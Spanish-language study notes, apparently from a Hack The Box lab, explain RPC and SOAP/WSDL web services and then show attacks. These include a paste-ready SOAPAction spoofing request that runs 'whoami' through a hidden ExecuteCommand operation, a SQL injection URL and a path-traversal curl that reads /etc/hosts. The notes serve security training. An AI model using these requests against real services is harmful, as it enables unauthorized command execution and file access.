
## Web Service Attacks

### Tipos

#### 1. ML-RPC (XML Remote Procedure Call)

- Protocolo simple para realizar llamadas a procedimientos remotos.
- Usa **XML** para codificar las solicitudes y respuestas.
- Usa normalmente **HTTP** como protocolo de transporte.
- Cada mensaje es un documento XML con:
    - Nombre del método a invocar.    
    - Parámetros.
- El servidor responde con un XML que incluye el resultado o un error.

##### Ejemplo

```http
  --> POST /RPC2 HTTP/1.0
  User-Agent: Frontier/5.1.2 (WinNT)
  Host: betty.userland.com
  Content-Type: text/xml
  Content-length: 181

  <?xml version="1.0"?>
  <methodCall>
    <methodName>examples.getStateName</methodName>
    <params>
       <param>
 		     <value><i4>41</i4></value>
 		     </param>
		  </params>
    </methodCall>

  <-- HTTP/1.1 200 OK
  Connection: close
  Content-Length: 158
  Content-Type: text/xml
  Date: Fri, 17 Jul 1998 19:55:08 GMT
  Server: UserLand Frontier/5.1.2-WinNT

  <?xml version="1.0"?>
  <methodResponse>
     <params>
        <param>
		      <value><string>South Dakota</string></value>
		      </param>
  	    </params>
   </methodResponse>

```

#### 1. JSON-RPC (JSON Remote Procedure Call)
 
- Similar a XML-RPC, pero usa **JSON** en lugar de XML.
- También diseñado para llamadas remotas a funciones.
- Puede funcionar sobre HTTP, WebSocket u otros transportes.
- Mensajes JSON con campos como:
    - `"method"`: nombre del método.
    - `"params"`: parámetros.
    - `"id"`: identificador de la llamada.
- Compatible con llamadas asincrónicas y notificaciones (sin respuesta).

##### Ejemplo

```http
--> POST /ENDPOINT HTTP/1.1
   Host: ...
   Content-Type: application/json-rpc
   Content-Length: ...

  {"method": "sum", "params": {"a":3, "b":4}, "id":0}

  <-- HTTP/1.1 200 OK
   ...
   Content-Type: application/json-rpc

   {"result": 7, "error": null, "id": 0}
```


#### 3. SOAP (Simple Object Access Protocol)
(hay mas variaciones de estas , `WS-BPEL` , `RESTful` ,)
- Protocolo completo basado en **XML** para comunicación estructurada.    
- Muy usado en entornos empresariales (servicios web SOAP).
- Normalmente sobre HTTP, pero también soporta SMTP, JMS, etc.
- Define mensajes con estructura XML muy estricta.
- Usa **WSDL** para describir los servicios.
- Incluye soporte para:
    - Autenticación.
    - Transacciones.
    - Seguridad (WS-Security).
    - Firmas y cifrado.

##### Ejemplo

```http
--> POST /Quotation HTTP/1.0
  Host: www.xyz.org
  Content-Type: text/xml; charset = utf-8
  Content-Length: nnn

  <?xml version = "1.0"?>
  <SOAP-ENV:Envelope
    xmlns:SOAP-ENV = "http://www.w3.org/2001/12/soap-envelope"
     SOAP-ENV:encodingStyle = "http://www.w3.org/2001/12/soap-encoding">

    <SOAP-ENV:Body xmlns:m = "http://www.xyz.org/quotations">
       <m:GetQuotation>
         <m:QuotationsName>MiscroSoft</m:QuotationsName>
      </m:GetQuotation>
    </SOAP-ENV:Body>
  </SOAP-ENV:Envelope>

  <-- HTTP/1.0 200 OK
  Content-Type: text/xml; charset = utf-8
  Content-Length: nnn

  <?xml version = "1.0"?>
  <SOAP-ENV:Envelope
   xmlns:SOAP-ENV = "http://www.w3.org/2001/12/soap-envelope"
    SOAP-ENV:encodingStyle = "http://www.w3.org/2001/12/soap-encoding">

  <SOAP-ENV:Body xmlns:m = "http://www.xyz.org/quotation">
  	  <m:GetQuotationResponse>
  	     <m:Quotation>Here is the quotation</m:Quotation>
     </m:GetQuotationResponse>
   </SOAP-ENV:Body>
  </SOAP-ENV:Envelope>
```

### Prueba

#### Arhivo WSDL

1. Nos dan esta IP

`http://<TARGET IP>:3002`

2. Haciendo fuzzing vemos el directorio

```shell-session
http://<TARGET IP>:3002/wsdl
```

wsdl -> Web Services Definition Language 

wsdl es un archivo XML que describe un servicio web SOAP, incluyendo:

- Métodos que expone el servicio.
- Parámetros que espera cada método.
- Tipos de datos.
- URL donde está disponible el servicio.

3. Al hacerle un curl a esa url vemos que está vacía , por ende fuzzeamos para encontrar un parametro que nos deje acceder al SOAP web service's WSDL file, y encontramos : 

`http://<TARGET IP>:3002/wsdl?wsdl`

wsdl files se pueden encontrar de muchas otras formas : `/example.wsdl`, `?wsdl`, `/example.disco`, `?disco`

#### WSDL File Breakdown

##### Definition

he root element of all WSDL files. Inside the definition, the name of the web service is specified, all namespaces used across the WSDL document are declared, and all other service elements are defined.

```xml
<wsdl:definitions targetNamespace="http://tempuri.org/" 

    <wsdl:types></wsdl:types>
    <wsdl:message name="LoginSoapIn"></wsdl:message>
    <wsdl:portType name="HacktheBoxSoapPort">
  	  <wsdl:operation name="Login"></wsdl:operation>
    </wsdl:portType>
    <wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">
  	  <wsdl:operation name="Login">
  		  <soap:operation soapAction="Login" style="document"/>
  		  <wsdl:input></wsdl:input>
  		  <wsdl:output></wsdl:output>
  	  </wsdl:operation>
    </wsdl:binding>
    <wsdl:service name="HacktheboxService"></wsdl:service>
</wsdl:definitions>
```


##### Data Types

The data types to be used in the exchanged messages

```xml
<wsdl:types>
    <s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">
  	  <s:element name="LoginRequest">
  		  <s:complexType>
  			  <s:sequence>
  				  <s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/>
  				  <s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/>
  			  </s:sequence>
  		  </s:complexType>
  	  </s:element>
  	  <s:element name="LoginResponse">
  		  <s:complexType>
  			  <s:sequence>
  				  <s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
  			  </s:sequence>
  		  </s:complexType>
  	  </s:element>
  	  <s:element name="ExecuteCommandRequest">
  		  <s:complexType>
  			  <s:sequence>
  				  <s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
  			  </s:sequence>
  		  </s:complexType>
  	  </s:element>
  	  <s:element name="ExecuteCommandResponse">
  		  <s:complexType>
  			  <s:sequence>
  				  <s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
  			  </s:sequence>
  		  </s:complexType>
  	  </s:element>
    </s:schema>
</wsdl:types>
```


##### Messages

Defines input and output operations that the web service supports. In other words, through the _messages_ element, the messages to be exchanged, are defined and presented either as an entire document or as arguments to be mapped to a method invocation.

```xml
<!-- Login Messages -->
<wsdl:message name="LoginSoapIn">
    <wsdl:part name="parameters" element="tns:LoginRequest"/>
</wsdl:message>
<wsdl:message name="LoginSoapOut">
    <wsdl:part name="parameters" element="tns:LoginResponse"/>
</wsdl:message>
<!-- ExecuteCommand Messages -->
<wsdl:message name="ExecuteCommandSoapIn">
    <wsdl:part name="parameters" element="tns:ExecuteCommandRequest"/>
</wsdl:message>
<wsdl:message name="ExecuteCommandSoapOut">
    <wsdl:part name="parameters" element="tns:ExecuteCommandResponse"/>
</wsdl:message>
```

##### Operation

Defines the available SOAP actions alongside the encoding of each message.

##### Port Type

Encapsulates every possible input and output message into an operation. More specifically, it defines the web service, the available operations and the exchanged messages. Please note that in WSDL version 2.0, the _interface_ element is tasked with defining the available operations and when it comes to messages the (data) types element handles defining them.

```xml
<wsdl:portType name="HacktheBoxSoapPort">
    <!-- Login Operaion | PORT -->
    <wsdl:operation name="Login">
  	  <wsdl:input message="tns:LoginSoapIn"/>
  	  <wsdl:output message="tns:LoginSoapOut"/>
    </wsdl:operation>
    <!-- ExecuteCommand Operation | PORT -->
    <wsdl:operation name="ExecuteCommand">
  	  <wsdl:input message="tns:ExecuteCommandSoapIn"/>
  	  <wsdl:output message="tns:ExecuteCommandSoapOut"/>
    </wsdl:operation>
</wsdl:portType>
```


##### Binding

Binds the operation to a particular port type. Think of bindings as interfaces. A client will call the relevant port type and, using the details provided by the binding, will be able to access the operations bound to this port type. In other words, bindings provide web service access details, such as the message format, operations, messages, and interfaces (in the case of WSDL version 2.0).

```xml
<wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">
    <soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>
    <!-- SOAP Login Action -->
    <wsdl:operation name="Login">
  	  <soap:operation soapAction="Login" style="document"/>
  	  <wsdl:input>
  		  <soap:body use="literal"/>
  	  </wsdl:input>
  	  <wsdl:output>
  		  <soap:body use="literal"/>
  	  </wsdl:output>
    </wsdl:operation>
    <!-- SOAP ExecuteCommand Action -->
    <wsdl:operation name="ExecuteCommand">
  	  <soap:operation soapAction="ExecuteCommand" style="document"/>
  	  <wsdl:input>
  		  <soap:body use="literal"/>
  	  </wsdl:input>
  	  <wsdl:output>
  		  <soap:body use="literal"/>
  	  </wsdl:output>
    </wsdl:operation>
</wsdl:binding>
```

##### Service

A client makes a call to the web service through the name of the service specified in the service tag. Through this element, the client identifies the location of the web service.

```xml
   <wsdl:service name="HacktheboxService">

      <wsdl:port name="HacktheboxServiceSoapPort" binding="tns:HacktheboxServiceSoapBinding">
        <soap:address location="http://localhost:80/wsdl"/>
      </wsdl:port>

    </wsdl:service>
```

### SOAPAction spoofing

Imaginemos que hemos encontrado el archivo WSDL de una SOAP , entonces vemos que además de la funcion login hay otra funcion que ejecuta comandos:
<img width="865" height="893" alt="image" src="https://github.com/user-attachments/assets/4da2f85a-59f8-4ca3-a825-106d7f2a2d7f" />


entonces el spoofing se basará en llamar a esta otra función oculta en un principio

<img width="771" height="368" alt="image" src="https://github.com/user-attachments/assets/cd415a17-8f4c-473f-a867-140b396a02c7" />


Payload:

<img width="782" height="498" alt="image" src="https://github.com/user-attachments/assets/e5a24e18-4afa-41a5-ac48-88d50617b9bb" />


Lo que está en verde lo ponemos porque en la primera foto de todas que puse si os dais cuenta también está subrayada esa url , básicamente si queremos llamar a la función de ejecutar comandos tenemos si o si que ponerla puesto que es parte del schema, mas que nada se ve en la jerarquía , donde la url contiene a las otras funciones, todas las demás cosas no las toqueis es solo mierda del formato de este Web Service , y lo que está en azul , si veis en la segunda foto que puse antes el Web Service
nos dice que tenemos que meter en la request esa SOAPAction.

Nota: en este caso no deja en HTB usar ExecuteCommandRequest porque dice que es privada y tal asi que hacemos el mismo ataque pero esta vez cambiando `ExecuteCommandRequest` por `LoginRequest` que si deja ejecutarla publicamente asi bypasseamos la restricción

#### Copia y pega
```
POST /wsdl HTTP/1.1 
Host: 10.129.110.14:3002 
Content-Type: text/xml; charset=utf-8 
Content-Length: 466 
SOAPAction: "ExecuteCommand" 

<?xml version="1.0" encoding="utf-8"?> 
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"> <soap:Body> <ExecuteCommandRequest xmlns="http://tempuri.org/"> <cmd>whoami</cmd> </ExecuteCommandRequest> </soap:Body> </soap:Envelope>
```

## API Attacks

Fuzzear como loco valores -> `http://caca/FUZZ=caca`

En el ejemplo de HTB el valor es id, ademas se le puede hacer una SQLi
`http://10.129.202.133:3003/?id=3+OR+1+=+1+--+-`

tambien se puede explotar LFI 

````shell-session
curl "http://<TARGET IP>:3000/api/download/..%2f..%2f..%2f..%2fetc%2fhosts"
````

Tambine XSS si el valor que pongamos se ve reflejado : 
` http://<TARGET IP>:3000/api/download/test_value`

También aplicable a ssrf 

tambien xxe 
Imágenes/
